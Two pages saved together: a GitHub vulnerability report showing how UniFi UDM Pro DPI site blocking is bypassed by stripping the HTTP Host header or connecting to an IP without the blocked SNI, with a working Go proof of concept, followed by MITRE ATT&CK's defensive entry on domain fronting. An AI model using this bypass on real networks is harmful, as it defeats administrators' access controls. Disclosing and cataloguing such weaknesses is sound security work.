=== Content from github.com_5cdb60db_20250114_225854.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ff1veT%2FBUG%2Fissues%2F1)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ff1veT%2FBUG%2Fissues%2F1)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=f1veT%2FBUG)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[f1veT](/f1veT)
/
**[BUG](/f1veT/BUG)**
Public

* [Notifications](/login?return_to=%2Ff1veT%2FBUG) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Ff1veT%2FBUG)
* [Star
   0](/login?return_to=%2Ff1veT%2FBUG)

* [Code](/f1veT/BUG)
* [Issues
  1](/f1veT/BUG/issues)
* [Pull requests
  0](/f1veT/BUG/pulls)
* [Actions](/f1veT/BUG/actions)
* [Projects
  0](/f1veT/BUG/projects)
* [Security](/f1veT/BUG/security)
* [Insights](/f1veT/BUG/pulse)

Additional navigation options

* [Code](/f1veT/BUG)
* [Issues](/f1veT/BUG/issues)
* [Pull requests](/f1veT/BUG/pulls)
* [Actions](/f1veT/BUG/actions)
* [Projects](/f1veT/BUG/projects)
* [Security](/f1veT/BUG/security)
* [Insights](/f1veT/BUG/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Ff1veT%2FBUG%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Ff1veT%2FBUG%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Bypass ubnt&unifi&ubiquiti UDM PRO Network DPI block WebSite #1

Open

[f1veT](/f1veT) opened this issue
Nov 15, 2022
· 0 comments

Open

# [Bypass ubnt&unifi&ubiquiti UDM PRO Network DPI block WebSite](#top) #1

[f1veT](/f1veT) opened this issue
Nov 15, 2022
· 0 comments

## Comments

[![@f1veT](https://avatars.githubusercontent.com/u/24734785?s=80&v=4)](/f1veT)

Copy link

Owner

### **[f1veT](/f1veT)** commented [Nov 15, 2022](#issue-1449188165) • edited Loading

| [Suggested description] This problem can make the administrator's protection against website restrictions, such as mining viruses, fail. TEST：UDM pro Web：7.2.95.0 Softversion：7.2.95[Vulnerability Type] incorrect access control[Vendor of Product] Unifi[Affected Product Code Base] unifi <= 7.2.95.0[Affected Component] Web DPI[Attack Type] Remote[Impact Denial of Service] true[Impact Escalation of Privileges] true [Attack Vectors] Describe the type of issue with as much detail as possible: Network Open DPI Limit function ，Rule ：Web services / Baidu。 bypass HTTP & HTTPS block What are all the steps required to reproduce the issue (also include the name of tools/scripts necessary to reproduce the issue)? 1、Set Block Rule  [image](https://user-images.githubusercontent.com/24734785/201833020-ee3eda99-f3c5-407b-9354-5fefd1ffa604.png)  2、test for curl  [image (1)](https://user-images.githubusercontent.com/24734785/201833129-c6642c8f-9d6d-4740-8eff-b03d254e4de4.png)  Bypass HTTP 3、UDM PRO DPI only check host。We can remove header in host。  [image (2)](https://user-images.githubusercontent.com/24734785/201833180-07b2d92c-ddc6-49fa-8f71-29d98a5bd408.png)  Bypass HTTPS 4、That check SNI Vul = [www.baidu.com](http://www.baidu.com/) We change IP Send Get data pack.  [image (3)](https://user-images.githubusercontent.com/24734785/201833204-15e473e4-b9d5-4638-895c-69a975565dce.png)  wirshark:  [image (4)](https://user-images.githubusercontent.com/24734785/201833290-aa323039-9928-41b5-8f14-75d8e956fb0e.png)  ``` package main  import (     "crypto/tls"     "crypto/x509"     "fmt"     "io/ioutil"     "net"     "net/http"     "strings"     "time"      "github.com/tidwall/gjson" )  func main() {      domainapi := "https://1.1.1.1/dns-query?name=www.baidu.com"     client2 := &http.Client{}     req2, err := http.NewRequest("GET", domainapi, strings.NewReader(""))     if err != nil {         // handle error     }      req2.Header.Set("accept", "application/dns-json")      resp2, err := client2.Do(req2)      defer resp2.Body.Close()      body2, err := ioutil.ReadAll(resp2.Body)     if err != nil {         // handle error     }      fmt.Println(string(body2))     ipp := gjson.Get(string(body2), "Answer")     ipp = gjson.Get(ipp.Array()[2].String(), "data")     url := "https://" + ipp.String() + "/"     //url := "https://www.cnblogs.com"     hostname := "baidu.com"      sni := false      var serverName string     if sni {         serverName = hostname     } else {         // disable sending the ServerName by using an IP         // see tls.Config.ServerName         serverName = ipp.String()     }      client := &http.Client{         // adapted from http.DefaultTransport         Transport: &http.Transport{             Proxy: http.ProxyFromEnvironment,             DialContext: (&net.Dialer{                 Timeout:   30 * time.Second,                 KeepAlive: 30 * time.Second,                 DualStack: true,             }).DialContext,             ForceAttemptHTTP2:     true,             MaxIdleConns:          100,             IdleConnTimeout:       90 * time.Second,             TLSHandshakeTimeout:   10 * time.Second,             ExpectContinueTimeout: 1 * time.Second,             TLSClientConfig: &tls.Config{                 ServerName: serverName,                 // bypass Go standard verification to use our own below (VerifyConnection)                 InsecureSkipVerify: true,                 VerifyConnection: func(cs tls.ConnectionState) error {                     // adapted from the tls.Config.VerifyConnection example                     // behaves just like the default verification,                     // except for the overriden DNSName below                     opts := x509.VerifyOptions{                         // override the requested hostname with the server hostname                         DNSName:       hostname,                         Intermediates: x509.NewCertPool(),                     }                     for _, cert := range cs.PeerCertificates[1:] {                         opts.Intermediates.AddCert(cert)                     }                     _, err := cs.PeerCertificates[0].Verify(opts)                     return err                 },             },         },     }     resp, err := client.Post(url, "application/x-www-form-urlencoded", strings.NewReader(""))     if err != nil {         fmt.Println(err)         // handle error      }      defer resp.Body.Close()      body, err := ioutil.ReadAll(resp.Body)      if err != nil {         fmt.Println("error2")          // handle error      }      fmt.Println(string(body))     fmt.Println(ipp.String()) } ```  ---   [Reference]  <https://xlab.tencent.com/cn/2021/05/14/domain-borrowing/>  <https://attack.mitre.org/techniques/T1090/004/>   ---   [Discoverer] admin@8sec.cc |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@f1veT](https://avatars.githubusercontent.com/u/24734785?s=40&v=4)](/f1veT)
[f1veT](/f1veT)
changed the title
~~Bypass ubnt&unifi UDM PRO Network DPI block WebSite~~
Bypass ubnt&unifi&ubiquiti UDM PRO Network DPI block WebSite
[Jan 12, 2023](#event-8210085004)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Ff1veT%2FBUG%2Fissues%2F1)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

1 participant

[![@f1veT](https://avatars.githubusercontent.com/u/24734785?s=52&v=4)](/f1veT)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from attack.mitre.org_046d0d2c_20250114_225852.html ===


[![](/theme/images/mitre_attack_logo.png)](/)

* [**Matrices**](/matrices/)
  [Enterprise](/matrices/enterprise/)
  [Mobile](/matrices/mobile/)
  [ICS](/matrices/ics/)
* [**Tactics**](/tactics/)
  [Enterprise](/tactics/enterprise/)
  [Mobile](/tactics/mobile/)
  [ICS](/tactics/ics/)
* [**Techniques**](/techniques/)
  [Enterprise](/techniques/enterprise/)
  [Mobile](/techniques/mobile/)
  [ICS](/techniques/ics/)
* [**Defenses**](/datasources)
  [Data Sources](/datasources)
  [**Mitigations**](/mitigations/)
  [Enterprise](/mitigations/enterprise/)
  [Mobile](/mitigations/mobile/)
  [ICS](/mitigations/ics/)

  [Assets](/assets)
* [**CTI**](/groups)
  [Groups](/groups)
  [Software](/software)
  [Campaigns](/campaigns)
* [**Resources**](/resources/)
  [Get Started](/resources/)
  [Learn More about ATT&CK](/resources/learn-more-about-attack/)
  [ATT&CKcon](/resources/attackcon/)
  [ATT&CK Data & Tools](/resources/attack-data-and-tools/)
  [FAQ](/resources/faq/)
  [Engage with ATT&CK](/resources/engage-with-attack/contact/)
  [Version History](/resources/versions/)
  [Legal & Branding](/resources/legal-and-branding/)
* [**Benefactors**](/resources/engage-with-attack/benefactors/)
* [**Blog**
  ![External site](/theme/images/external-site.svg)](https://medium.com/mitre-attack/)
* Search

Reminder: the TAXII 2.0 server [retired on December 18](https://medium.com/mitre-attack/introducing-taxii-2-1-and-a-fond-farewell-to-taxii-2-0-d9fca6ce4c58). Please switch to the [TAXII 2.1 server](https://github.com/mitre-attack/attack-workbench-taxii-server/blob/main/docs/USAGE.md) to ensure uninterrupted service.

1. [Home](/)
2. [Techniques](/techniques/enterprise)
3. [Enterprise](/techniques/enterprise)
4. [Proxy](/techniques/T1090)
5. Domain Fronting

# Proxy: Domain Fronting

##### Other sub-techniques of Proxy (4)

| ID | Name |
| --- | --- |
| [T1090.001](/techniques/T1090/001/) | [Internal Proxy](/techniques/T1090/001/) |
| [T1090.002](/techniques/T1090/002/) | [External Proxy](/techniques/T1090/002/) |
| [T1090.003](/techniques/T1090/003/) | [Multi-hop Proxy](/techniques/T1090/003/) |
| T1090.004 | Domain Fronting |

Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. [[1]](http://www.icir.org/vern/papers/meek-PETS-2015.pdf) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, "domainless" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).

For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.

ID: T1090.004

Sub-technique of:
[T1090](/techniques/T1090)

ⓘ

Tactic:
[Command and Control](/tactics/TA0011)

ⓘ

Platforms: Linux, Windows, macOS

Contributors: Matt Kelly, @breakersall

Version: 1.1

Created: 14 March 2020

Last Modified: 30 March 2023

[Version Permalink](/versions/v16/techniques/T1090/004/ "Permalink to this version of T1090.004")

[Live Version](/versions/v16/techniques/T1090/004/ "Go to the live version of T1090.004")

## Procedure Examples

| ID | Name | Description |
| --- | --- | --- |
| [G0016](/groups/G0016) | [APT29](/groups/G0016) | [APT29](/groups/G0016) has used the meek domain fronting plugin for [Tor](/software/S0183) to hide the destination of C2 traffic.[[2]](https://www.slideshare.net/slideshow/no-easy-breach-derby-con-2016/66447908) |
| [S0154](/software/S0154) | [Cobalt Strike](/software/S0154) | [Cobalt Strike](/software/S0154) has the ability to accept a value for HTTP Host Header to enable domain fronting.[[3]](https://web.archive.org/web/20210708035426/https%3A//www.cobaltstrike.com/downloads/csmanual43.pdf) |
| [S0175](/software/S0175) | [meek](/software/S0175) | [meek](/software/S0175) uses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended destination. |
| [S0699](/software/S0699) | [Mythic](/software/S0699) | [Mythic](/software/S0699) supports domain fronting via custom request headers.[[4]](https://docs.mythic-c2.net/) |
| [S0649](/software/S0649) | [SMOKEDHAM](/software/S0649) | [SMOKEDHAM](/software/S0649) has used a fronted domain to obfuscate its hard-coded C2 server domain.[[5]](https://www.fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html) |

## Mitigations

| ID | Mitigation | Description |
| --- | --- | --- |
| [M1020](/mitigations/M1020) | [SSL/TLS Inspection](/mitigations/M1020) | If it is possible to inspect HTTPS traffic, the captures can be analyzed for connections that appear to be domain fronting. |

## Detection

| ID | Data Source | Data Component | Detects |
| --- | --- | --- | --- |
| [DS0029](/datasources/DS0029) | [Network Traffic](/datasources/DS0029) | [Network Traffic Content](/datasources/DS0029/#Network%20Traffic%20Content) | Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)). |

## References

1. [David Fifield, Chang Lan, Rod Hynes, Percy Wegmann, and Vern Paxson. (2015). Blocking-resistant communication through domain fronting. Retrieved November 20, 2017.](http://www.icir.org/vern/papers/meek-PETS-2015.pdf)
2. [Dunwoody, M. and Carr, N.. (2016, September 27). No Easy Breach DerbyCon 2016. Retrieved September 12, 2024.](https://www.slideshare.net/slideshow/no-easy-breach-derby-con-2016/66447908)
3. [Strategic Cyber LLC. (2020, November 5). Cobalt Strike: Advanced Threat Tactics for Penetration Testers. Retrieved April 13, 2021.](https://web.archive.org/web/20210708035426/https%3A//www.cobaltstrike.com/downloads/csmanual43.pdf)

1. [Thomas, C. (n.d.). Mythc Documentation. Retrieved March 25, 2022.](https://docs.mythic-c2.net/)
2. [FireEye. (2021, June 16). Smoking Out a DARKSIDE Affiliate’s Supply Chain Software Compromise. Retrieved September 22, 2021.](https://www.fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html)

×

load more results

[![](/theme/images/mitrelogowhiteontrans.gif)](https://www.mitre.org)

[Contact Us](/resources/engage-with-attack/contact)

[Terms of Use](/resources/legal-and-branding/terms-of-use)

[Privacy Policy](/resources/legal-and-branding/privacy)

[Website Changelog](/resources/changelog.html "ATT&CK content v16.1
Website  v4.2.1")

© 2015 - 2024, The MITRE Corporation. MITRE ATT&CK and ATT&CK are registered trademarks of The MITRE Corporation.


